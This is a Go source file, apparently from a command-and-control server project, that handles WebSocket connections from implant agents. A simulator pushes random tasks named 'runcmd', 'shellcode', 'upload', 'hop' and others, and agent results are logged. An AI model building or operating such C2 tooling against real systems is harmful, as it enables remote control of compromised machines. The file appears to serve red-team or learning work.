package router

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"math/rand"
	"net/http"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"time"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func WSHandler(w http.ResponseWriter, r *http.Request) {
	// (1) UPGRADE from HTTP/1.1 to WebSocket connection
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	// (2) Extract Agent ID
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		log.Println("Agent connected without an ID")
		return
	}

	// (3) DETERMINE PROTOCOL
	var agentProtocol config.AgentProtocol

	if r.TLS == nil {
		agentProtocol = config.WebsocketClear
	} else {
		agentProtocol = config.WebsocketSecure
	}

	log.Printf("AGENT CONNECTED | ID: %s | Protocol: %s |\n", agentID, agentProtocol)

	// (4) COMMAND ISSUANCE SIMULATOR (we'll delete this later)
	// Seed the random number generator
	seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))

	// ------------------ NEW LOGIC: Start Tasking Goroutine ------------------
	// This goroutine will be responsible for proactively pushing tasks to the agent.
	go func() {
		for {
			// 1. Wait for 5 seconds before attempting to issue a new task.
			time.Sleep(5 * time.Second)

			var response models.ServerTaskResponse

			// 2. Randomly decide whether to issue a task or not (50/50 chance).
			if seededRand.Intn(2) == 0 {
				// No task is available.
				response.TaskAvailable = false
				log.Printf("No command issued to Agent %s", agentID)
			} else {
				// A task is available, so populate the details.
				response.TaskAvailable = true
				response.TaskID = generateTaskID() // Assumes generateTaskID() is accessible

				// Randomly select a command.
				commands := []string{"runcmd", "upload", "download", "enumerate",
					"shellcode", "morph", "hop", "doesnotexist"}
				response.Command = commands[seededRand.Intn(len(commands))]

				// Data field is intentionally left empty as requested.
				response.Data = nil

				log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s (WebSocket)\n", response.Command, response.TaskID, agentID)
			}

			// 3. Marshal the response struct to JSON.
			jsonResponse, err := json.Marshal(response)
			if err != nil {
				log.Printf("Error marshalling task for Agent %s: %v", agentID, err)
				continue // Skip this iteration on error
			}

			// 4. Write the JSON message to the WebSocket connection.
			if err := conn.WriteMessage(websocket.TextMessage, jsonResponse); err != nil {
				log.Printf("Error sending task to Agent %s: %v", agentID, err)
				// If we can't write, the connection is likely broken. Exit the goroutine.
				return
			}
		}
	}()
	// --------------------------------------------------------------------------

	// (5) READING LOOP - Reading messages FROM the agent (e.g., task results)
	for {
		// ReadMessage is a blocking call. It will wait here for the agent to send a message.
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("AGENT DISCONNECTED: %s. Reason: %v", agentID, err)
			break // Exit the loop if the connection is closed or an error occurs.
		}

		log.Printf("Received message of type %d from Agent %s: %s", messageType, agentID, string(p))

		// Process the received message from the agent.
		if messageType == websocket.TextMessage || messageType == websocket.BinaryMessage {
			procErr := wsProcessIncomingMessage(conn, agentID, agentProtocol, p)
			if procErr != nil {
				log.Printf("|❗ERR WS HANDLER| AgentID: %s - Error processing incoming message: %v. Continuing read loop.", agentID, procErr)
			}
		}
	}
}

func wsProcessIncomingMessage(conn *websocket.Conn, agentID string, agentProtocol config.AgentProtocol, p []byte) error {
	log.Printf("|_DBG WS HANDLER| AgentID: %s - Processing message (%d bytes)", agentID, len(p))

	// 1. Unmarshal the raw JSON into our AgentTaskResult struct
	var result models.AgentTaskResult
	if err := json.Unmarshal(p, &result); err != nil {
		log.Printf("|❗ERR RESULT|-> Error unmarshaling result JSON from agent %s: %v\n", agentID, err)
		return fmt.Errorf("Error unmarshaling result JSON from agent %s: %v", agentID, err)
	}

	// Create a temporary struct for logging so we can display output as a string
	prettyResult := struct {
		TaskID string `json:"task_id"`
		Status string `json:"status"`
		Output any    `json:"output"` // Changed to string for display
		Error  string `json:"error"`
	}{
		TaskID: result.TaskID,
		Status: result.Status,
		Output: result.Output, // Convert byte slice to string here
		Error:  result.Error,
	}

	// 2. Re-marshal the struct into a "pretty" indented JSON string
	prettyJSON, err := json.MarshalIndent(prettyResult, "", "  ") // Using two spaces for indentation
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error re-marshaling for pretty printing: %v\n", err)
	}
	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s\n--- Task Result ---\n%s\n-------------------\n", agentID, string(prettyJSON))

	// --- PRETTY PRINT LOGIC ENDS HERE ---

	return nil
}
